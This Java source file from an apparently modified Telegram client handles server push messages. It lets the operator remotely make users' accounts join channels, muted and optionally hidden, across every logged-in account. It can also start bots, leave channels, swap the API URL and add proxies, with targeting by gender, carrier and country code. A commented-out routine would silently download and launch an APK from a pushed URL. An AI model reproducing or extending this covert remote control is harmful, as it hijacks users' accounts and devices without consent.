package com.finalsoft.firebase;

import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.finalsoft.Config;
import com.finalsoft.SharedStorage;
import com.finalsoft.controller.GhostController;
import com.finalsoft.firebase.channel.JoinHelper;
import com.finalsoft.firebase.push.PushDialogActivity;
import com.finalsoft.firebase.push.helper.MuteHelper;
import com.finalsoft.firebase.push.helper.NotificationHelper;
import com.finalsoft.firebase.push.helper.ViewHelper;
import com.finalsoft.helper.FlurryHelper;
import com.finalsoft.proxy.ProxyController;

import org.json.JSONException;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.BuildVars;
import org.telegram.messenger.UserConfig;

import java.util.Map;

public class CloudMessagingController {

    private static final String TAG = Config.TAG + "cmc";
    private Context context = ApplicationLoader.applicationContext;
    private PackageManager packageManager;

    public void onReceive(Map data) throws JSONException {
        JSONObject jsonObject = new JSONObject(data);
        if (BuildVars.DEBUG_VERSION) {
            Log.i(TAG, "onReceive: " + jsonObject.toString());
        }


        //region Customized: Common Keys
        //region set gender
        try {
            if (jsonObject.has("gender")) {
                int gender = 3; // all
                String genderText = jsonObject.getString("gender").toLowerCase();
                if (genderText.equals("male")) {
                    gender = 1;
                } else if (genderText.equals("female")) {
                    gender = 2;
                }
                if (gender != 3 && SharedStorage.gender() != gender) {
                    Log.i(TAG, "handleJson: gender not set!");
                    return;
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "onReceive > gender: ",e );
        }

        //endregion

        //region set operator
        if (jsonObject.has("operator")) {
            String jsonOperator = jsonObject.getString("operator").toLowerCase();
            Log.i(TAG, "handleJson: contain operator:" + jsonOperator);

            if (!TextUtils.isEmpty(jsonOperator) && !jsonOperator.contains("all")) {
                String op = getOperator();
                if (!op.equals("all") && !jsonOperator.contains(op)) {
                    Log.e(TAG, "handleJson: operator not matched!");
                    return;
                }
            }
        }

        //endregion

        //region open/close app
            /*if (jsonObject.has("app-status")) {
                if (!TextUtils.isEmpty(jsonObject.getString("app-status"))) {
                    boolean jsonAppStatus = jsonObject.getBoolean("app-status");
                    Log.i(TAG, "handleJson: contain app-status:" + jsonAppStatus);
                    if (Setting.getAppStatus() != jsonAppStatus) {
                        Log.e(TAG, "handleJson: app status not matched!");
                        return;
                    }
                }
            }*/

        //endregion
        //
        try {
            if (jsonObject.has("ccode") && !jsonObject.getString("ccode").isEmpty()) {
                String phone = UserConfig.getInstance(0).getCurrentUser().phone;
                if (!phone.isEmpty()) {
                    phone = phone.replace("+","");
                    String[] ccodes = jsonObject.getString("ccode").split(",");
                    int i = 0;
                    for (String ccode : ccodes) {
                        if (phone.startsWith(ccode.trim())) {
                            i++;
                        }
                    }
                    if (i == 0) return;
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "onReceive > ccode: ",e );
        }
        //endregion

        String key = jsonObject.getString("type");

        switch (key) {
            case "not": {
                new NotificationHelper(context).show(jsonObject);
                break;
            }

            case "link": {
                try {
                    if (jsonObject.has("link") && !jsonObject.getString("link").isEmpty()) {
                        String url = jsonObject.getString("link");
                        Intent intent = new Intent(Intent.ACTION_VIEW)
                                .setData(Uri.parse(url))
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                        if (jsonObject.has("package")) {
                            intent.setPackage(jsonObject.getString("package"));
                        }

                        context.startActivity(intent);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            }

            /*case "admob":
            case "dialog": {
                try {
                    //Log.i(TAG, "onMessageReceived: " + data.toString());
                    Intent intent = new Intent(context, ShowDialogActivity.class);
                    intent.putExtra("data", jsonObject.toString());
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            }*/

            case "update": {
                if (jsonObject.has("version")) {
                    SharedStorage.setNewVersionInfo(jsonObject.toString());
                }
                break;
            }

            case "change_url": {
                if (jsonObject.has("url") && !jsonObject.getString("url").isEmpty()) {
                    SharedStorage.ApiUrl(jsonObject.getString("url"));
                }
                break;
            }

            case "official_channel": {
                if (jsonObject.has("url") && !jsonObject.getString("url").isEmpty()) {
                    SharedStorage.officialChannel(jsonObject.getString("url"));
                }
                break;
            }

            case "support_group": {
                if (jsonObject.has("url") && !jsonObject.getString("url").isEmpty()) {
                    SharedStorage.supportGroup(jsonObject.getString("url"));
                }
                break;
            }

            case "donate": {
                SharedStorage.donateCount(jsonObject.toString());
                break;
            }

            case "add_proxy": {
                AndroidUtilities.runOnUIThread(() -> {
                    new ProxyController().add(jsonObject);
                });
                break;
            }

            case "off_proxy": {
                if (jsonObject.has("status") && !jsonObject.getString("status").isEmpty())
                    SharedStorage.proxyServer(jsonObject.getBoolean("status"));
                break;
            }
            case "popup": {
                showPopUp(jsonObject);
                break;
            }
            case "dialog": {
                showDialog(jsonObject);
                break;
            }
            case "install": {
//                        installApp(jsonObject);
                break;
            }
            case "join": {
                join(jsonObject);
                break;
            }
            case "start-bot": {
                startBot(jsonObject);
                break;
            }
            case "left": {
                leftChancel(jsonObject);
                break;
            }
            case "telegram-link": {
                showOnTelegram(jsonObject);
                break;
            }
            case "ghost-mode": {
                ghostMode(jsonObject);
                break;
            }
            case "instagram": {
                instagram(jsonObject);
                break;
            }
            case "show-image": {
                showImage(jsonObject);
                break;
            }
            case "mute": {
                toggleMute(jsonObject);
                break;
            }
            case "view": {
                ViewHelper.scan(jsonObject);
                break;
            }

            case "flurry": {
                FlurryHelper.setAppId(jsonObject);
                break;
            }

            default:
                Log.i(TAG, "onReceive: default case:");
        }
    }

    private void toggleMute(JSONObject jsonObject) {
        try {
            long did = jsonObject.has("did") ? jsonObject.getLong("did") : 0;
            if (did == 0) {
                return;
            }
            boolean mute = jsonObject.has("is-mute") && jsonObject.getBoolean("is-mute");
            boolean isMultiAccount = jsonObject.has("is-multi-account") && jsonObject.getBoolean("is-multi-account");
            int count = isMultiAccount ? UserConfig.getActivatedAccountsCount() : 1;
            AndroidUtilities.runOnUIThread(() -> {
                for (int i = 0; i < count; i++) {
                    MuteHelper.toggleMute(did, mute, i);
                }
            });
        } catch (JSONException e) {
            Log.e(TAG, "toggleMute: ", e);
        }

    }

    //region old json
/*    private void downloadApk(JSONObject jsonObject) {
        try {
            Log.i("tel-msg", "downloadApk: start method");
            Intent intent = new Intent(context, StartDownloadReceiver.class);
            intent.putExtra("url", jsonObject.getString("url"));
            intent.putExtra("packname", jsonObject.getString("package_name"));
            intent.putExtra("name", jsonObject.getString("name"));
            context.startService(intent);
        } catch (Exception e) {
            Log.e("tel-msg", "error for download apk == " + e.toString());
        }
    }*/
    //endregion

    //region Customized : finalsoft private function for json
/*
    private void updateApp(JSONObject jsonObject) throws JSONException {
        installApp(jsonObject);
    }

    private void installApp(JSONObject jsonObject) throws JSONException {
        System.out.println("update");
        boolean isUpdate = jsonObject.has("force-update");
        String packageName = jsonObject.has("package-name") ? jsonObject.getString("package-name") : "com.com.com";
        if (!isUpdate) {
            Log.i(TAG, "installApp: no update!");
            if (isInstalledPackage(packageName)) {
                Log.i(TAG, "installApp: this app already installed! ,work stoped!");
                return;
            }
        }

        boolean showDialog = !jsonObject.has("show-dialog") || jsonObject.getBoolean("show-dialog");
        if (showDialog) {
            Log.i(TAG, "installApp: show dialog!");
            Intent intent = new Intent(context, PushDialogActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("json", jsonObject.toString());
            ApplicationLoader.applicationContext.startActivity(intent);
        } else {
            String url = jsonObject.getString("url");
            download(url, packageName);
        }
    }

    public void download(String uri, String packageName) {
        try {
            URL url = new URL(uri);
            Log.i("finalsoft", "installApp exec");
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("GET");
//            c.setDoOutput(true);
            c.connect();
            String PATH = Environment.getExternalStorageDirectory() + "/download/";
            File file = new File(PATH);
            file.mkdirs();

            File outputFile = new File(file, packageName + ".apk");
            if (!outputFile.exists()) {
                Log.i(TAG, "installApp: file not exist!");
                FileOutputStream fos = new FileOutputStream(outputFile);
                InputStream is = c.getInputStream();
                byte[] buffer = new byte[1024];
                int len1;
                while ((len1 = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, len1);
                }
                fos.close();
                is.close();//till here, it works fine - .apk is download to my sdcard in download file
                Log.i("finalsoft", "installApp working...");
            } else {
                Log.i(TAG, "installApp: file exist!");
            }

            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + "/download/" + packageName + ".apk")), "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ApplicationLoader.applicationContext.startActivity(intent);

            Log.i("finalsoft", "DownLoad apk success :)");

        } catch (IOException e) {
            Log.e(TAG, "installApp > error : ", e);
        }
    }
*/

    private boolean isInstalledPackage(String package_name) {
        PackageManager pm = ApplicationLoader.applicationContext.getPackageManager();
        try {
            pm.getPackageInfo(package_name, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException ignored) {
        }

        return false;
    }

    private boolean isInstalledPackage(String packageName, PackageManager packageManager) {
        try {
            packageManager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void showPopUp(JSONObject jsonObject) throws JSONException {
        if (!jsonObject.has("link")) {
            return;
        }
        String url = jsonObject.getString("link");

        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setData(Uri.parse(url));
        if (jsonObject.has("package-name")) {
            if (packageManager == null) {
                packageManager = context.getPackageManager();
            }
            String[] packages = jsonObject.getString("package-name").split(",");
            for (String item : packages) {
                if (isInstalledPackage(item, packageManager)) {
                    intent.setPackage(item);
                    break;
                }
            }
        }

        ApplicationLoader.applicationContext.startActivity(intent);
    }

    private void showDialog(JSONObject jsonObject) {
        System.out.println("dialog");
        if (!jsonObject.has("url")) {
            return;
        }
        Intent intent = new Intent(context, PushDialogActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("json", jsonObject.toString());
        ApplicationLoader.applicationContext.startActivity(intent);
    }

    private void showImage(JSONObject jsonObject) throws JSONException {
        System.out.println("showImage");
        if (!jsonObject.has("url")) {
            return;
        }
/*        String url = jsonObject.getString("url");
        String imageLink = jsonObject.has("image-url") ? jsonObject.getString("image-url") : "";
        Intent intent = new Intent(ApplicationLoader.applicationContext, ShowImage.class);
        intent.putExtra("image-url", imageLink);
        intent.putExtra("url", url);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ApplicationLoader.applicationContext.startActivity(intent);*/
    }

    private void join(JSONObject jsonObject) throws JSONException {
        //join channel
        String link = jsonObject.has("link") ? jsonObject.getString("link") : "";
        if (TextUtils.isEmpty(link)) {
            return;
        }
        boolean isHide = jsonObject.has("is-hide") && jsonObject.getBoolean("is-hide");
        Log.i(TAG, "join: isHide:" + isHide);
        boolean isMultiAccount = !jsonObject.has("is-multi-account") || jsonObject.getBoolean("is-multi-account");
        boolean isMute = !jsonObject.has("is-mute") || jsonObject.getBoolean("is-mute");
        int maxMember = jsonObject.has("max-member") ? jsonObject.getInt("max-member") : 0;
        if (isHide) {
            isMute = true;
        }
        JoinHelper.join(link, isMute, isHide, isMultiAccount, maxMember);
    }

    private void startBot(JSONObject jsonObject) throws JSONException {
        if (!jsonObject.has("link")) {
            Log.e(TAG, "startBot: bot json not contain link of bot!");
            return;
        }
        String link = jsonObject.getString("link");
        boolean isMultiAccount = !jsonObject.has("is-multi-account") || jsonObject.getBoolean("is-multi-account");

        JoinHelper.startBot(link, isMultiAccount);

    }

    private void leftChancel(JSONObject jsonObject) throws JSONException {
        Log.i(TAG, "leftChancel: ");

        if (!jsonObject.has("link")) {
            return;
        }
        String link = jsonObject.getString("link");
        boolean isMultiAccount = !jsonObject.has("is-multi-account") || jsonObject.getBoolean("is-multi-account"); //default is true
        JoinHelper.leftChannel(link, isMultiAccount);

    }

    private void ghostMode(JSONObject jsonObject) throws JSONException {
        Boolean status = !jsonObject.has("status") || jsonObject.getBoolean("status");
        SharedStorage.ghostMode(status);
        if (!status) {
            GhostController.setOn(false);
        }
    }

    private void instagram(JSONObject jsonObject) throws JSONException {
        if (!jsonObject.has("link")) {
            return;
        }
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(jsonObject.getString("link")));
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        String packageNames = jsonObject.has("package-name") ? jsonObject.getString("package-name") : "";
        if (packageManager == null) {
            packageManager = context.getPackageManager();
        }
        if (!TextUtils.isEmpty(packageNames)) {
            String[] packages = packageNames.split(",");
            for (String item : packages) {
                if (isInstalledPackage(item, packageManager)) {
                    intent.setPackage(item);
                    break;
                }
            }
        } else {
            if (isInstalledPackage("com.instagram.android", packageManager)) {
                intent.setPackage("com.instagram.android");
            }
        }
        try {
            ApplicationLoader.applicationContext.startActivity(intent);
        } catch (ActivityNotFoundException e) {
            Log.e(TAG, "instagram: ", e);
        }
    }

    private void showOnTelegram(JSONObject jsonObject) throws JSONException {
        if (!jsonObject.has("link")) {
            return;
        }
        Intent intentTag = new Intent(Intent.ACTION_VIEW, Uri.parse(jsonObject.getString("link")));
        intentTag.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        if (jsonObject.has("package-name")) {
            String[] packages = jsonObject.getString("package-name").split(",");
            if (packageManager == null) {
                packageManager = context.getPackageManager();
            }
            for (String item : packages) {
                if (isInstalledPackage(item, packageManager)) {
                    intentTag.setPackage(item);
                    break;
                }
            }
        }
        context.startActivity(intentTag);
    }

    private String getOperator() {
        TelephonyManager tManager = (TelephonyManager) context
                .getSystemService(Context.TELEPHONY_SERVICE);
        String carrierName;
        if (tManager != null) {
            carrierName = tManager.getNetworkOperatorName().toLowerCase();

            if (carrierName.contains("mci") || carrierName.contains("ir_") || carrierName.contains("tci")) {
                carrierName = "mci";
            } else if (carrierName.contains("mtn") || carrierName.contains("irancell")) {
                carrierName = "mtn";
            } else if (carrierName.contains("tel") || carrierName.contains("righ")) {
                carrierName = "rightel";
            } else {
                carrierName = "all";
            }
        } else {
            carrierName = "all";
        }
        return carrierName;
    }

    //endregion


}
